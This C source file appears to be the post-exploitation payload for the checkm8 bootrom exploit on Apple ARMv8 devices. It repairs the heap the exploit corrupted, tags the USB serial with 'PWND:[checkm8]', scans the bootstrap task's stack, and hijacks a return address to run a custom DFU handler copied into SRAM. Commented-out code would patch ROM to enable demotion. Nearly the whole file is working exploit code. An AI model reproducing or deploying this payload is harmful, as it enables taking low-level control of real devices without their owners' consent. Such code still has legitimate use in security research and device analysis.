#include <util/armv8.h>
#include "bootrom_func.h"

GLOBAL_PTR(addr_bootstrap_task, ADDR_BOOTSTRAP_TASK)
GLOBAL_PTR(addr_demote_reg, ADDR_DEMOTE_REG)
GLOBAL_PTR(addr_usb_serial, ADDR_USB_SERIAL)

GLOBAL_STR(pwnd_str, " PWND:[checkm8]");

PAYLOAD_SECTION
void patch_serial()
{
    int len, base;
    char *serial = GET_GLOBAL(addr_usb_serial);
    char *patch = GET_PTR_TO_GLOBAL(pwnd_str);

    base = dev_strlen(serial);
    len = dev_strlen(patch);

    dev_memcpy(serial + base, patch, len);
    *((uint8_t *) ADDR_CORE_DESC_SERIAL) =
            usb_create_descriptor(serial);
}

PAYLOAD_SECTION
void fix_heap()
{
    struct heap_header *broken = (struct heap_header *) 0x1801B9200;
    broken->curr_size = 4;
    broken->curr_free = 0;
    broken->prev_size = 2;
    broken->prev_free = 0;

    calc_chksum(&broken->chksum, &broken->curr_size, 32, (void *) ADDR_HEAP_COOKIE);

    struct heap_header *next = (struct heap_header *) 0x1801B9300;
    next->prev_size = 4;
    calc_chksum(&next->chksum, &next->curr_size, 32, (void *) ADDR_HEAP_COOKIE);
}

PAYLOAD_SECTION
void *copy_handler(uint32_t offset, uint32_t len)
{
    uint8_t *base;
    uint8_t *target = dev_malloc(len);

    __asm__ volatile ("adr %0, _start" : "=r" (base));
    dev_memcpy(target, base + offset, len);
    return target;
}

PAYLOAD_SECTION
void run(uint64_t handler_data)
{
    // todo: this is half patchfinding and half hardcoded -- it would be good to standardize (once it works)
    uint64_t *bs_task, **bs_sp, *bs_fp;
    uint32_t bs_val, *patch_dst;

    uint32_t handler_offset = handler_data & 0xFFFFFFFF;
    uint32_t handler_len = (handler_data >> 32u) & 0xFFFFFFFF;

    fix_heap();
    check_all_chksums();
    patch_serial();

    bs_task = GET_GLOBAL(addr_bootstrap_task);
    bs_fp = (uint64_t *) bs_task[35];
    bs_sp = (uint64_t **) bs_task[37];

    while(1)
    {
        // spin if searched entire stack
//        if(bs_sp == bs_fp) while(1);

        // search for the tbnz after getDFUImage
        // first look for the return address on the stack
        if(*bs_sp >= (uint64_t *) 0x100000000 &&
           *bs_sp <= (uint64_t *) 0x100020000)
        {
            // then check if the return address matches tbnz instruction pattern
            bs_val = *((uint32_t *) *bs_sp);
            if((bs_val & 0xFFFF0000) == 0x37f80000)
                break;
        }

        bs_sp++;
    }

    patch_dst = copy_handler(handler_offset, handler_len);
    *bs_sp = EXECUTABLE_SRAM(((void *) patch_dst));

    // enable demote boot
//    *(uint32_t *)(WRITEABLE_ROM(0x100006c54)) = MOVZ(X0, 1, 0);
//    __asm__ volatile ("dmb sy");
//    __asm__ volatile ("ic iallu");
//    __asm__ volatile ("dsb sy");
//    __asm__ volatile ("isb");

    // hop out of DFU mode, into our own DFU handler
    *((int *) ADDR_DFU_RETVAL) = -1;
    *((char *) ADDR_DFU_STATUS) = 1;
    event_notify((struct event *) ADDR_DFU_EVENT);
}


void _start(uint64_t handler_data)
{
    run(handler_data);
}